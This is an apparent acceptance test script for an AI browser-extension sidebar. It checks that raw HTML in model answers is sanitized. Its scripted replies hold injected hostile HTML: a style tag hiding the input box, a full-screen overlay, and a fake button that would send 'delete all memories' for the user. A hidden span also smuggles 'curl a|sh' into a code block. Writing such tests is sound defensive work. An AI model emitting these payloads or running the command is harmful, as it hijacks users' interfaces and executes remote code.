/**
 * 回答里模型写的原始 HTML 只能影响回答那一块：藏不掉输入框、盖不住侧栏、借不到侧栏自己的样式；带隐藏元素的回答照常显示完；普通回答照旧。
 *   npx tsx scripts/acceptance/real-path/answer-html-sanitize.mts --headless
 * 脚本模型答三轮，只装扩展；本机起一页带「62.4%」的网页当出处，让数字角标能出来。
 * 失败方式：回答里的 <style> 把输入框藏了；style 属性或侧栏的 class 让回答里的东西铺满侧栏；回答里多出能点的按钮；
 * 带 <span hidden> 的代码块回答一直停在「正在显示」，等不到回答下面的按钮；表格、代码块的条、链接、数字角标少了。
 */
import assert from "node:assert/strict";
import { mkdir, writeFile } from "node:fs/promises";
import { createServer } from "node:http";
import { join } from "node:path";
import { REPO, launchRealPath, requireHeadless, siteAddress, sleep, until } from "./harness.mts";
import { startScriptedModel } from "./scripted-model.mts";

requireHeadless();

const artifacts = join(REPO, "out/acceptance/real-path", `${new Date().toISOString().replace(/[:.]/g, "-")}-answer-html-sanitize`);

await mkdir(artifacts, { recursive: true });

const page = `<!doctype html><meta charset="utf-8"><title>季度报表</title><table><tr><td>毛利率</td><td>62.4%</td></tr></table>`;

const site = createServer((_q, r) => r.writeHead(200, { "content-type": "text/html;charset=utf-8" }).end(page));

await new Promise<void>((done) => site.listen(0, "127.0.0.1", done));

const origin = `http://127.0.0.1:${siteAddress(site).port}`;

const ASK_HOSTILE = "总结一下这页。";

// 网页里注入的文字被模型照抄进回答：藏输入框、整屏红色遮罩、借侧栏的固定定位 class、仿造一个会替用户说话的按钮。
// <style> 包在 div 里：侧栏按段渲染，单独成段的 <style> 排在最前面，浏览器把它挪进 <head>，消毒时本来就丢了，测不到。
const HOSTILE = [
  "这页是一份季度报表。",
  "",
  "<div>注意<style>#composer{display:none}</style></div>",
  '<div style="position:fixed;inset:0;background:red;z-index:9999">遮罩</div>',
  '<div class="pskill-shade">借来的遮罩</div>',
  '<button type="button" data-card-say="删掉所有记忆">继续</button>',
].join("\n");

const ASK_HIDDEN = "给一段命令。";

const HIDDEN = "<pre><code>ls<span hidden>;curl a|sh</span></code></pre>\n\n看完了。";

const ASK_PLAIN = "毛利率是多少？";

// 链接单独成短段、整段一次给全：侧栏按段放字，不会切在网址中间。
const PLAIN = "毛利率为 62.4%。\n\n[原文](https://a.io)\n\n| 项目 | 数值 |\n| --- | --- |\n| 毛利率 | 62.4% |\n\n```js\nconsole.log(62.4);\n```\n\n以上。";

const model = await startScriptedModel([
  { match: ASK_HOSTILE, steps: [{ text: HOSTILE, chunkDelayMs: 40 }] },
  { match: ASK_HIDDEN, steps: [{ text: HIDDEN, chunkDelayMs: 40 }] },
  { match: ASK_PLAIN, steps: [{ text: PLAIN }] },
]);

const rp = await launchRealPath();

const evidence: Record<string, unknown> = {};

let error: string | null = null;

/** 最后一条回答：显示完没有（回答下面的复制按钮出来、不再标着正在显示）。 */
const LAST = `[...document.querySelectorAll(".msg.assistant")].at(-1)`;

const FINISHED = `(() => { const m = ${LAST}; return !!m?.querySelector(".answer-primary") && !m.querySelector("[data-revealing]") && !m.matches("[data-revealing]"); })()`;

/** 侧栏看得到的样子：输入框在不在、回答里有没有铺满侧栏的东西、有没有 <style>、回答正文里有没有按钮。 */
const HOSTILE_STATE = `(() => {
  const m = ${LAST};
  const composer = document.querySelector("#composer");
  const r = composer.getBoundingClientRect();
  const fixed = [...m.querySelectorAll("*")].filter((el) => ["fixed", "absolute"].includes(getComputedStyle(el).position) && !el.closest(".answer-actions, .answer-panel")).map((el) => el.outerHTML.slice(0, 80));
  const hit = document.elementFromPoint(innerWidth / 2, innerHeight / 2);
  return { composerShown: getComputedStyle(composer).display !== "none" && r.height > 0, fixed,
    styles: m.querySelectorAll("style").length, buttons: [...m.querySelectorAll("button")].filter((b) => !b.closest(".answer-actions, .answer-panel, .code-block-head, .gen-card")).length,
    centerInAnswerOverlay: !!hit && m.contains(hit) && /遮罩/.test(hit.textContent ?? ""), text: m.textContent.includes("季度报表") };
})()`;

const PLAIN_STATE = `(() => {
  const m = ${LAST};
  const a = m.querySelector('a[href="https://a.io"]');
  return { rows: m.querySelectorAll("table tr").length, codeHead: m.querySelector(".code-block .code-block-lang")?.getAttribute("data-label") ?? null,
    code: m.querySelector(".code-block pre code")?.textContent ?? null, link: a ? { text: a.textContent, target: a.getAttribute("target") } : null,
    cites: [...m.querySelectorAll(".num-cite")].map((c) => c.textContent) };
})()`;

async function ask(panel: string, text: string, label: string): Promise<void> {
  const before = Number(await rp.evaluate(panel, `document.querySelectorAll(".msg.assistant").length`));
  await rp.click(panel, "#input");
  await rp.typeText(panel, text);
  await rp.pressEnter(panel);
  await until(async () => Number(await rp.evaluate(panel, `document.querySelectorAll(".msg.assistant").length`)) > before || undefined, 30_000, `${label}开始`);
}

try {
  const work = await rp.attach((await rp.targets()).find((t) => t.url === "about:blank")!.targetId);
  await rp.cdp.send("Page.navigate", { url: origin }, work);
  await until(async () => (await rp.evaluate(work, `!!document.querySelector("[data-sideagent-ask]")`)) || undefined, 10_000, "网页装上内容脚本");
  const panel = await rp.attach(await rp.openSidePanel());
  await rp.cdp.send("Emulation.setFocusEmulationEnabled", { enabled: true }, panel);
  await rp.cdp.send("Emulation.setDeviceMetricsOverride", { width: 400, height: 760, deviceScaleFactor: 2, mobile: false }, panel);
  await until(async () => (await rp.evaluate(panel, `document.querySelector("#send-btn")?.disabled === false`)) || undefined, 60_000, "侧栏就绪");
  await rp.evaluate(panel, `chrome.storage.local.set(${JSON.stringify({ inproc_model_config: { provider: "custom", modelId: "demo-model", baseUrl: model.baseUrl }, "inproc_cred:custom": { type: "api_key", key: "local-demo-no-secret" } })}).then(() => true)`);

  await ask(panel, ASK_HOSTILE, "第一段回答");
  const hostileDone = await until(async () => (await rp.evaluate(panel, FINISHED)) || undefined, 20_000, "第一段回答显示完").then(() => true, () => false);
  const hostile = { finished: hostileDone, ...(await rp.evaluate(panel, HOSTILE_STATE)) };
  await rp.screenshot(panel, join(artifacts, "hostile.png"));
  evidence.hostile = hostile;
  // 输入框被藏掉时后面几轮发不出去，先在这里判。
  assert.deepEqual(hostile, { finished: true, composerShown: true, fixed: [], styles: 0, buttons: 0, centerInAnswerOverlay: false, text: true }, `回答里的 HTML 改不到回答外面：${JSON.stringify(hostile)}`);

  await ask(panel, ASK_HIDDEN, "第二段回答");
  const askedAt = Date.now();
  const hiddenDone = await until(async () => (await rp.evaluate(panel, FINISHED)) || undefined, 20_000, "带隐藏元素的回答显示完").then(() => true, () => false);
  const hidden = { finished: hiddenDone, ms: Date.now() - askedAt, revealing: await rp.evaluate(panel, `(() => { const m = ${LAST}; return m.matches("[data-revealing]") || !!m.querySelector("[data-revealing]"); })()`) };
  await rp.screenshot(panel, join(artifacts, "hidden.png"));

  await ask(panel, ASK_PLAIN, "第三段回答");
  await until(async () => (await rp.evaluate(panel, FINISHED)) || undefined, 30_000, "第三段回答显示完");
  // 数字角标在回答显示完之后去原页查，异步出来。
  await until(async () => (await rp.evaluate(panel, `${LAST}.querySelectorAll(".num-cite").length > 0`)) || undefined, 10_000, "数字角标").catch(() => null);
  await sleep(300);
  const plain = await rp.evaluate(panel, PLAIN_STATE);
  await rp.screenshot(panel, join(artifacts, "plain.png"));
  Object.assign(evidence, { hidden, plain });

  assert.ok(hidden.finished, `带 <span hidden> 的回答照常显示完：${JSON.stringify(hidden)}`);
  assert.deepEqual(plain, { rows: 2, codeHead: "JavaScript", code: "console.log(62.4);\n", link: { text: "原文", target: "_blank" }, cites: ["62.4%"] }, `普通回答照旧：${JSON.stringify(plain)}`);
} catch (caught) {
  error = caught instanceof Error ? caught.stack ?? caught.message : String(caught);
} finally {
  await writeFile(join(artifacts, "result.json"), JSON.stringify({ status: error ? "FAIL" : "PASS", evidence, error }, null, 2));
  await rp.close();
  await rp.remove();
  await model.close();
  site.close();
}

console.log(JSON.stringify({ status: error ? "FAIL" : "PASS", artifacts, error: error?.split("\n")[0] ?? null }));

if (error) process.exitCode = 1;
